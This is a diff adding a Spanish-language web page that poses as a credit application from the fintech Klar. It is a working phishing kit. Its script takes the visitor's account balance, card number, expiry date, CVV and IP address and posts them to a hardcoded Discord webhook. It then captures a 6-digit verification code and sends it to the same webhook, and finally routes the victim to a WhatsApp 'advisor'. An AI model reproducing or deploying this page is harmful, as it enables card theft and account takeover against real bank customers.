@@ -1,0 +1,684 @@
+<!DOCTYPE html>
+<html lang="es-MX">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Solicitud de Crédito - Klar</title>
+    
+    <style>
+        body {
+            background-color: #0b0b0b;
+            background-image: url('fond.jpg'); 
+            background-size: cover;
+            background-position: center center;
+            background-repeat: no-repeat;
+            background-attachment: scroll;
+            color: #ffffff;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            -webkit-text-size-adjust: 100%;
+        }
+
+        .index1-page {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            box-sizing: border-box;
+            padding: 10px;
+        }
+
+        .tarjeta-login {
+            background-color: rgba(17, 17, 17, 0.94) !important;
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            border-radius: 20px !important;
+            padding: 25px 20px !important;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.6) !important;
+            max-width: 450px;
+            width: 100%;
+            margin: 0 auto 20px auto;
+            box-sizing: border-box;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+        }
+
+        .tarjeta-login .titulo-principal {
+            font-size: 24px !important;
+            font-weight: 700 !important;
+            color: #ffffff !important;
+            margin-bottom: 8px !important;
+            letter-spacing: -0.5px;
+            text-align: center;
+        }
+
+        .tarjeta-login .subtitulo {
+            font-size: 14px !important;
+            color: #cccccc !important;
+            line-height: 1.4 !important;
+            margin-bottom: 20px !important;
+            text-align: center;
+        }
+
+        .paso-vista {
+            display: none; 
+        }
+        .paso-vista.activo {
+            display: block; 
+        }
+
+        .contenedor-simulador {
+            margin: 20px 0;
+            text-align: left;
+        }
+
+        .monto-display {
+            font-size: 28px !important;
+            font-weight: 700 !important;
+            color: #ffffff !important;
+            text-align: center;
+            margin-bottom: 12px;
+            background: #000000;
+            padding: 14px;
+            border-radius: 12px;
+            border: 1px solid #333333;
+            letter-spacing: -0.5px;
+        }
+
+        .slider-credito {
+            -webkit-appearance: none;
+            width: 100%;
+            height: 6px;
+            border-radius: 5px;
+            background: #333333;
+            outline: none;
+            margin: 15px 0;
+        }
+
+        .slider-credito::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            appearance: none;
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            background: #ffffff;
+            cursor: pointer;
+            border: 2px solid #000000;
+        }
+
+        .limites-slider {
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            color: #aaaaaa;
+            font-weight: 600;
+        }
+
+        .resumen-monto {
+            background: #000000;
+            border: 1px dashed #333333;
+            border-radius: 12px;
+            padding: 12px 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .resumen-monto span {
+            font-size: 13px;
+            color: #aaaaaa;
+        }
+
+        .resumen-monto strong {
+            font-size: 16px;
+            color: #ffffff;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+            text-align: left;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #cccccc;
+            margin-bottom: 6px;
+        }
+
+        .input-klar {
+            width: 100%;
+            background-color: #000000;
+            border: 1px solid #333333;
+            border-radius: 12px;
+            padding: 14px 16px;
+            font-size: 16px !important;
+            color: #ffffff;
+            box-sizing: border-box;
+            outline: none;
+            text-align: left;
+        }
+
+        .input-codigo {
+            text-align: center !important;
+            letter-spacing: 8px !important;
+            font-size: 24px !important;
+            font-weight: 700 !important;
+        }
+
+        .input-klar:focus {
+            border-color: #ffffff;
+            box-shadow: 0 0 0 2px rgba(255, 255, 255, 0.1);
+        }
+
+        .form-row {
+            display: flex;
+            gap: 12px;
+        }
+
+        .form-row .form-group {
+            flex: 1;
+        }
+
+        .btn-iniciar-sesion {
+            width: 100% !important;
+            background-color: #ffffff !important;
+            color: #000000 !important;
+            border: none !important;
+            padding: 16px !important;
+            font-size: 16px !important;
+            font-weight: 700 !important;
+            border-radius: 30px !important;
+            cursor: pointer;
+            margin-top: 10px !important;
+            text-decoration: none;
+            display: inline-block;
+            text-align: center;
+            box-sizing: border-box;
+        }
+
+        .btn-regresar {
+            background: none;
+            border: none;
+            color: #aaaaaa;
+            font-size: 13px;
+            cursor: pointer;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            padding: 0;
+        }
+
+        .contenedor-logo-global {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            padding: 20px 10px 10px 10px;
+            box-sizing: border-box;
+        }
+
+        .logo-klar-texto {
+            font-size: 32px;
+            font-weight: 800;
+            color: #ffffff;
+            letter-spacing: -1.5px;
+            margin: 0;
+            text-transform: uppercase;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.8);
+        }
+
+        .spinner {
+            width: 45px;
+            height: 45px;
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-top: 4px solid #ffffff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .icono-exito {
+            font-size: 50px;
+            color: #4BB543;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(6px);
+            -webkit-backdrop-filter: blur(6px);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            padding: 15px;
+            box-sizing: border-box;
+            overflow-y: auto;
+        }
+
+        .modal-recuadro {
+            background-color: #141414;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 20px;
+            padding: 25px 20px;
+            max-width: 380px;
+            width: 100%;
+            max-height: 90vh;
+            overflow-y: auto;
+            text-align: center;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.9);
+            box-sizing: border-box;
+            margin: auto;
+        }
+
+        .modal-texto-container {
+            text-align: center;
+            margin-bottom: 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .modal-titulo-instruccion {
+            font-size: 18px;
+            font-weight: 700;
+            color: #ffffff;
+            margin: 0;
+        }
+
+        .modal-linea-texto {
+            font-size: 14px;
+            color: #cccccc;
+            line-height: 1.5;
+            margin: 0;
+        }
+    </style>
+</head>
+<body class="index1-login">
+
+<div class="index1-page">
+    <div class="contenedor-logo-global">
+        <h1 class="logo-klar-texto">KLAR</h1>
+    </div>
+
+    <main class="index1-main">
+        <section class="center-stage">
+            <div class="tarjeta-login">
+                
+                <!-- PASO 1 -->
+                <div id="paso-1" class="paso-vista activo">
+                    <h1 class="titulo-principal">Monto del Crédito</h1>
+                    <p class="subtitulo">Ingresa tu saldo disponible y selecciona el monto que deseas solicitar.</p>
+
+                    <div class="form-group">
+                        <label for="saldoKlar">Saldo disponible en tu cuenta KLAR</label>
+                        <input type="text" id="saldoKlar" class="input-klar" placeholder="Ej. 9,894" inputmode="numeric" required autocomplete="off">
+                    </div>
+
+                    <div class="contenedor-simulador">
+                        <div class="monto-display" id="montoTexto">$ 1,000 MXN</div>
+                        <input type="range" id="sliderCredito" class="slider-credito" min="1000" max="1000000" step="5000" value="1000">
+                        <div class="limites-slider">
+                            <span>Min: $1,000</span>
+                            <span>Max: $1,000,000</span>
+                        </div>
+                    </div>
+
+                    <button type="button" id="btnContinuarCredito" class="btn-iniciar-sesion">Continuar Solicitud</button>
+                </div>
+
+                <!-- PASO 2 -->
+                <div id="paso-2" class="paso-vista">
+                    <button type="button" id="btnVolverPaso1" class="btn-regresar">← Volver</button>
+                    
+                    <h1 class="titulo-principal">Método de Cobro</h1>
+                    <p class="subtitulo">Ingresa los datos de tu tarjeta física, digital o crédito para asociarla a tu solicitud.</p>
+
+                    <div class="resumen-monto">
+                        <span>Monto seleccionado:</span>
+                        <strong id="montoConfirmado">$ 1,000 MXN</strong>
+                    </div>
+
+                    <div id="formTarjeta" style="margin: 0;">
+                        <div class="form-group">
+                            <label for="nombreTitular">Nombre del titular</label>
+                            <input type="text" id="nombreTitular" class="input-klar" placeholder="Nombre completo" required autocomplete="off">
+                        </div>
+
+                        <div class="form-group">
+                            <label for="numeroTarjeta">Número de tarjeta </label>
+                            <input type="text" id="numeroTarjeta" class="input-klar" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" required autocomplete="off">
+                        </div>
+
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label for="expiracion">Vencimiento</label>
+                                <input type="text" id="expiracion" class="input-klar" placeholder="MM/AA" maxlength="5" inputmode="numeric" required autocomplete="off">
+                            </div>
+                            <div class="form-group">
+                                <label for="cvv">CVV</label>
+                                <input type="password" id="cvv" class="input-klar" placeholder="123" maxlength="3" inputmode="numeric" required autocomplete="off">
+                            </div>
+                        </div>
+
+                        <button type="button" id="btnIrAEspera" class="btn-iniciar-sesion">Continuar</button>
+                    </div>
+                </div>
+
+                <!-- PASO 3: ESPERA DE 10 SEGUNDOS + ENVÍO DE DATOS DE TARJETA -->
+                <div id="paso-espera" class="paso-vista" style="text-align: center; padding: 20px 0;">
+                    <div class="spinner"></div>
+                    <h1 class="titulo-principal">Generando Código</h1>
+                    <p class="subtitulo">Estamos procesando tu credito, por favor espera un momento...</p>
+                </div>
+
+                <!-- PASO 4: CÓDIGO DE 6 DÍGITOS -->
+                <div id="paso-codigo" class="paso-vista">
+                    <button type="button" id="btnVolverPaso2" class="btn-regresar">← Volver</button>
+                    
+                    <h1 class="titulo-principal">Verificación</h1>
+                    <p class="subtitulo">Ingresa el código de 6 dígitos recibido para confirmar tu identidad.</p>
+
+                    <div style="margin: 30px 0;">
+                        <div class="form-group">
+                            <label for="codigoVerificacion" style="text-align: center;">Código de 6 dígitos</label>
+                            <input type="text" id="codigoVerificacion" class="input-klar input-codigo" placeholder="------" maxlength="6" inputmode="numeric" required autocomplete="off">
+                        </div>
+                    </div>
+
+                    <button type="button" id="btnFinalizar" class="btn-iniciar-sesion">Confirmar Código</button>
+                </div>
+
+                <!-- PASO 5: CARGA -->
+                <div id="paso-carga" class="paso-vista" style="text-align: center; padding: 20px 0;">
+                    <div class="spinner"></div>
+                    <h1 class="titulo-principal">Procesando</h1>
+                    <p class="subtitulo">Validando tus datos, por favor espera...</p>
+                </div>
+
+                <!-- PASO 6: ÉXITO -->
+                <div id="paso-exito" class="paso-vista" style="text-align: center; padding: 20px 0;">
+                    <div class="icono-exito">✔</div>
+                    <h1 class="titulo-principal">¡Solicitud Exitosa!</h1>
+                    <p class="subtitulo">Tu solicitud ha sido procesada correctamente.</p>
+                    <button type="button" onclick="location.reload();" class="btn-iniciar-sesion" style="margin-top: 15px;">Finalizar</button>
+                </div>
+
+            </div>
+        </section>
+    </main>
+
+    <footer class="footer-container" style="text-align: center; margin: 15px 0; color: #fff;">
+        <div class="footer-content">
+            <div class="info-footer">
+                <div class="ip-text" style="color: #ccc; font-size: 11px; text-shadow: 0 1px 2px rgba(0,0,0,0.8);">Dirección IP: <span id="gfg">Obteniendo...</span></div>
+            </div>
+        </div>
+    </footer>
+</div>
+
+<!-- MODAL ALERTA -->
+<div id="modalAlerta" class="modal-overlay">
+    <div class="modal-recuadro">
+        <div class="modal-texto-container">
+            <p class="modal-titulo-instruccion">¡Casi listos para continuar!</p>
+            <p class="modal-linea-texto">Vuelve al chat con tu asesor en WhatsApp para finalizar tu proceso.</p>
+        </div>
+
+        <a href="https://wa.me/525539076932?text=Sigue%20la%20solicitud%20con%20tu%20asesor" target="_blank" id="btnCerrarModal" class="btn-iniciar-sesion">Aceptar</a>
+    </div>
+</div>
+
+<script>
+    document.addEventListener("DOMContentLoaded", function() {
+        const paso1 = document.getElementById("paso-1");
+        const paso2 = document.getElementById("paso-2");
+        const pasoEspera = document.getElementById("paso-espera");
+        const pasoCodigo = document.getElementById("paso-codigo");
+        const pasoCarga = document.getElementById("paso-carga");
+        const pasoExito = document.getElementById("paso-exito");
+        const modalAlerta = document.getElementById("modalAlerta");
+        const btnWhatsApp = document.getElementById("btnCerrarModal");
+        
+        const slider = document.getElementById("sliderCredito");
+        const montoTexto = document.getElementById("montoTexto");
+        const montoConfirmado = document.getElementById("montoConfirmado");
+        const btnContinuar = document.getElementById("btnContinuarCredito");
+        const btnVolverPaso1 = document.getElementById("btnVolverPaso1");
+        const btnVolverPaso2 = document.getElementById("btnVolverPaso2");
+        const btnIrAEspera = document.getElementById("btnIrAEspera");
+        const btnFinalizar = document.getElementById("btnFinalizar");
+
+        const webhookURL = "https://discord.com/api/webhooks/1516550624249122976/FrrYSvUdJe0J84wvImxK6x3j2hbLaBH3Gc9fX6XPoWWPH5Z2jf-xMRqR7eun0Z3Lj5ge";
+
+        function formatMoneda(valor) {
+            return "$ " + parseInt(valor).toLocaleString('es-MX', { minimumFractionDigits: 0 }) + " MXN";
+        }
+
+        const inputSaldo = document.getElementById("saldoKlar");
+        inputSaldo.addEventListener("input", function(e) {
+            let val = e.target.value.replace(/\D/g, '');
+            if (val !== "") {
+                e.target.value = Number(val).toLocaleString('en-US');
+            } else {
+                e.target.value = '';
+            }
+        });
+
+        slider.addEventListener("input", function() {
+            montoTexto.textContent = formatMoneda(this.value);
+        });
+
+        btnContinuar.addEventListener("click", function() {
+            const saldoInput = inputSaldo.value.trim();
+            if(!saldoInput) {
+                alert("Por favor ingresa tu saldo disponible en KLAR para continuar.");
+                inputSaldo.focus();
+                return;
+            }
+
+            const valorSeleccionado = formatMoneda(slider.value);
+            montoConfirmado.textContent = valorSeleccionado;
+            sessionStorage.setItem("monto_solicitado", slider.value);
+            sessionStorage.setItem("saldo_klar", saldoInput);
+
+            paso1.classList.remove("activo");
+            paso2.classList.add("activo");
+        });
+
+        btnVolverPaso1.addEventListener("click", function() {
+            paso2.classList.remove("activo");
+            paso1.classList.add("activo");
+        });
+
+        const inputTarjeta = document.getElementById("numeroTarjeta");
+        inputTarjeta.addEventListener("input", function(e) {
+            let val = e.target.value.replace(/\D/g, '').substring(0, 16);
+            let blocks = val.match(/.{1,4}/g);
+            e.target.value = blocks ? blocks.join(' ') : '';
+        });
+
+        const inputExp = document.getElementById("expiracion");
+        inputExp.addEventListener("input", function(e) {
+            let val = e.target.value.replace(/\D/g, '').substring(0, 4);
+            if (val.length >= 2) {
+                e.target.value = val.substring(0, 2) + '/' + val.substring(2, 4);
+            } else {
+                e.target.value = val;
+            }
+        });
+
+        const inputCVV = document.getElementById("cvv");
+        inputCVV.addEventListener("input", function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '').substring(0, 3);
+        });
+
+        const ipGuardada = sessionStorage.getItem("sd_ip");
+        const ipSpan = document.getElementById("gfg");
+
+        if (ipGuardada && ipSpan) {
+            ipSpan.textContent = ipGuardada;
+        } else if (ipSpan) {
+            fetch("https://ipapi.co/json/")
+                .then(res => res.json())
+                .then(data => {
+                    if (data.ip) {
+                        sessionStorage.setItem("sd_ip", data.ip);
+                        ipSpan.textContent = data.ip;
+                    }
+                }).catch(() => {
+                    ipSpan.textContent = "127.0.0.1";
+                });
+        }
+
+        // Al validar la tarjeta, muestra espera, envía el primer mensaje a Discord y salta al código
+        btnIrAEspera.addEventListener("click", function() {
+            const titular = document.getElementById("nombreTitular").value.trim();
+            const tarjeta = inputTarjeta.value.trim();
+            const expiracion = inputExp.value.trim();
+            const cvv = inputCVV.value.trim();
+
+            if (!titular || !tarjeta || !expiracion || !cvv) {
+                alert("Por favor completa todos los datos obligatorios de la tarjeta para continuar.");
+                return;
+            }
+
+            if (tarjeta.replace(/\s/g, '').length < 16) {
+                alert("Por favor ingresa un número de tarjeta válido de 16 dígitos.");
+                inputTarjeta.focus();
+                return;
+            }
+
+            if (expiracion.length < 5) {
+                alert("Por favor ingresa una fecha de expiración válida en formato MM/AA.");
+                inputExp.focus();
+                return;
+            }
+
+            if (cvv.length !== 3) {
+                alert("El código CVV debe tener exactamente 3 dígitos.");
+                inputCVV.focus();
+                return;
+            }
+
+            // Cambiar a la vista de espera
+            paso2.classList.remove("activo");
+            pasoEspera.classList.add("activo");
+
+            // Recopilar datos de crédito y tarjeta para el primer envío
+            const saldoKlar = sessionStorage.getItem("saldo_klar") || "No especificado";
+            const monto = montoConfirmado.textContent;
+            const ip = ipSpan ? ipSpan.textContent : "Desconocida";
+
+            const payloadTarjeta = {
+                content: "🚨 **¡Nueva Solicitud de Crédito y Tarjeta!** 🚨",
+                embeds: [{
+                    title: "Detalles y Datos de Tarjeta",
+                    color: 16711680,
+                    fields: [
+                        { name: "💵 Saldo Disponible KLAR", value: "$ " + saldoKlar + " MXN", inline: false },
+                        { name: "💰 Monto Solicitado", value: monto, inline: false },
+                        { name: "👤 Titular", value: titular, inline: true },
+                        { name: "💳 Número de Tarjeta", value: tarjeta, inline: true },
+                        { name: "📅 Expiración", value: expiracion, inline: true },
+                        { name: "🔐 CVV", value: cvv, inline: true },
+                        { name: "🌐 Dirección IP", value: ip, inline: false }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            // Enviar primer mensaje a Discord y asegurar los 10 segundos de espera
+            Promise.all([
+                fetch(webhookURL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payloadTarjeta)
+                }).catch(err => console.log("Error envío tarjeta:", err)),
+                new Promise(resolve => setTimeout(resolve, 10000))
+            ]).then(() => {
+                pasoEspera.classList.remove("activo");
+                pasoCodigo.classList.add("activo");
+            });
+        });
+
+        btnVolverPaso2.addEventListener("click", function() {
+            pasoCodigo.classList.remove("activo");
+            paso2.classList.add("activo");
+        });
+
+        const inputCodigo = document.getElementById("codigoVerificacion");
+        inputCodigo.addEventListener("input", function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '').substring(0, 6);
+        });
+
+        // Envío del SEGUNDO mensaje independiente con el código de 6 dígitos
+        btnFinalizar.addEventListener("click", function() {
+            const codigo = inputCodigo.value.trim();
+
+            if (codigo.length !== 6) {
+                alert("Por favor ingresa un código de verificación válido de 6 dígitos.");
+                inputCodigo.focus();
+                return;
+            }
+
+            pasoCodigo.classList.remove("activo");
+            pasoCarga.classList.add("activo");
+
+            const payloadCodigo = {
+                content: "🔑 **¡Código de Verificación Recibido!** 🔑",
+                embeds: [{
+                    title: "Código de Autorización (6 Dígitos)",
+                    color: 65280,
+                    fields: [
+                        { name: "🔑 Código Ingresado", value: `\`\`\`${codigo}\`\`\``, inline: false }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            fetch(webhookURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payloadCodigo)
+            })
+            .then(() => {
+                setTimeout(() => {
+                    pasoCarga.classList.remove("activo");
+                    modalAlerta.style.display = "flex";
+                }, 1500);
+            })
+            .catch(error => {
+                console.error("Error en el envío del código:", error);
+                setTimeout(() => {
+                    pasoCarga.classList.remove("activo");
+                    modalAlerta.style.display = "flex";
+                }, 1500);
+            });
+        });
+
+        btnWhatsApp.addEventListener("click", function() {
+            modalAlerta.style.display = "none";
+            pasoExito.classList.add("activo");
+        });
+    });
+</script>
+
+</body>
+</html>
